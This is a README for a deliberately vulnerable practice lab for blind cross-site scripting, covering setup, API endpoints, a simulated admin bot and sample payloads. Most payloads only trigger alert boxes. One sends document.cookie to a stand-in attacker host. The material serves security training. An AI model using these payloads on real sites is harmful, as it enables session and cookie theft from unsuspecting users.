# Blind XSS Practice Lab

A deliberately vulnerable web application designed for practicing Blind XSS (Cross-Site Scripting) attacks in a safe, controlled environment.

## 🚨 Security Warning

This application is intentionally vulnerable and should only be used for educational purposes in a secure, isolated environment. Do not deploy this application in production or expose it to the internet without proper security controls.

## 🎯 What is Blind XSS?

Blind XSS is a type of Cross-Site Scripting attack where the malicious payload is stored and executed on a server-side application, often in admin panels or user management systems. Unlike regular XSS, the attacker doesn't immediately see the results - they must wait for an admin or privileged user to access the payload, which then sends data back to the attacker's server.

## 📋 Features

- **Vulnerable endpoints**: Multiple input points where XSS payloads can be injected
- **Admin bot simulation**: A background process that "reads" stored reports, executing any XSS payloads
- **Real-time feedback**: Immediate visibility of XSS payload execution
- **Admin dashboard**: Review flagged payloads, severities, and detection reasons in a simple UI
- **Educational focus**: Clear warnings and explanations about security risks

## 🛠️ Technologies Used

- Next.js (Pages Router)
- Node.js
- In-memory storage system
- Concurrent bot polling system

## 🚀 Quick Start

### Prerequisites
- Node.js 18+ 
- npm 9+ (or equivalent package manager)

### Installation
1. Clone the repository (or navigate to your existing project directory)
2. Install dependencies:
   ```bash
   npm install
   ```

### Running the Application
1. Start the development server with the bot:
   ```bash
   npm run dev
   ```
   The application will start at `http://localhost:3000` (or next available port if 3000 is taken)

2. The bot will automatically start polling for XSS payloads in the background

### Production Build (Optional)
For a production-like setup:
```bash
npm run build && npm start
```

## 🎮 How to Practice Blind XSS

### Method 1: User-Agent Payload
1. Navigate to the main page
2. Enter an XSS payload in the "Enter XSS Payload" field (e.g., `<img src=x onerror=alert('XSS')>`)
3. Click "Submit Payload"
4. The bot will automatically check new reports every few seconds
5. When the bot "reads" your report, your payload will execute

### Method 2: Contact Form
1. Use the contact form on the page
2. The form will capture your browser's User-Agent string
3. If your User-Agent contains XSS code, it may be detected by the bot

### Method 3: API Direct Access
You can also submit payloads directly to the API:
```bash
curl -X POST http://localhost:3000/api/reports \
  -H 'Content-Type: application/json' \
  -d '{"userAgent":"<img src=x onerror=alert(1)>"}'
```

## 🔍 Available Endpoints

### Main Application Endpoints
- `GET /` - Main application interface

### API Endpoints
- `GET /api/reports` - List all stored reports
- `POST /api/reports` - Submit a new report with a User-Agent payload
- `GET /api/comments` - List all comments
- `POST /api/comments` - Submit a new comment (potential XSS vector)
- `POST /api/contact` - Submit a contact form (captures User-Agent)
- `GET /api/xss-payloads` - List collected XSS payloads
- `GET /api/bot` - Manually trigger the bot to scan for XSS payloads
- `GET|POST /api/collect-xss` - Endpoint for collecting payload data (returns 1x1 GIF)
- `GET /admin` - Minimal dashboard that surfaces flagged reports and detection reasons

## 🤖 Bot Behavior

The application includes a "bot" that simulates an admin user reviewing reports. Every 3 seconds, the bot:

1. Checks `/api/bot` endpoint for new reports
2. Scans recent reports (past 5 minutes) for potential XSS payloads
3. If XSS-like patterns are detected, they are flagged with a severity and detection rule
4. In a real scenario, the bot would execute the JavaScript code in a browser context

You can also visit `/admin` to see the flagged reports, their severities (low/medium/high), and the rules that triggered them. The page auto-refreshes every few seconds to mirror the polling bot.

## 🧪 Common XSS Payloads to Test

> ⚠️ These are for educational purposes only!

```html
<!-- Basic alert -->
<script>alert('XSS')</script>

<!-- Image tag with onerror -->
<img src=x onerror=alert('XSS')>

<!-- JavaScript in href -->
<a href="javascript:alert('XSS')">Click me</a>

<!-- More stealthy -->
<svg onload=alert('XSS')>

<!-- Event handlers -->
<div onmouseover=alert('XSS')>Hover over me</div>

<!-- External payload -->
<img src=x onerror=fetch('http://attacker.com/log?cookie='+document.cookie)>
```

## 🔧 Configuration Options

You can customize the bot behavior using environment variables:

- `BOT_URL` - Change the URL the bot polls (default: `http://localhost:3000/api/bot`)
- `BOT_INTERVAL_MS` - Change polling interval (default: 3000ms)
- `PORT` - Change the application port (default: 3000)

Example:
```bash
BOT_INTERVAL_MS=5000 npm run dev
```

## 🐛 Troubleshooting

### Common Issues

**Port already in use**
- Change default port: `PORT=3001 npm run dev`

**No XSS execution observed**
- Ensure your payload is correctly formed and can execute
- Some browsers may block certain payloads due to built-in protections
- Try different payload variations

**Data disappears after restart**
- The application uses in-memory storage that resets when the server stops
- This is by design for security purposes

**Bot error messages**
- Minor bot errors may occur but shouldn't affect functionality
- The bot is designed to continuously run and handle errors gracefully

## 🏗️ Project Structure

```
├── pages/              # Next.js pages (UI and API routes)
│   ├── index.js        # Main application page
│   └── api/            # Server-side API routes
├── lib/                # Helper functions
│   └── memory-store.js # In-memory data storage
├── scripts/            # Utility scripts
│   └── bot.js          # Automated bot script
├── package.json        # Project dependencies and scripts
└── README.md           # This file
```

## 📚 Learning Objectives

By using this application, you will learn:
- How Blind XSS attacks work
- Common XSS payload techniques
- How to test for blind XSS vulnerabilities
- The importance of input validation and output encoding
- How administrators can be targeted through web applications

## 🛡️ Security Considerations

- This application should only be run in isolated, controlled environments
- Never run this on a production server or expose to external networks
- Data is stored in memory and not persisted to disk
- The application is intentionally vulnerable - do not use as a security reference

## 🙏 Credits

This application was adapted from the original BlindXSS-Lab by 3xecutablefile.

## 📝 License

This project is for educational purposes only. Use responsibly.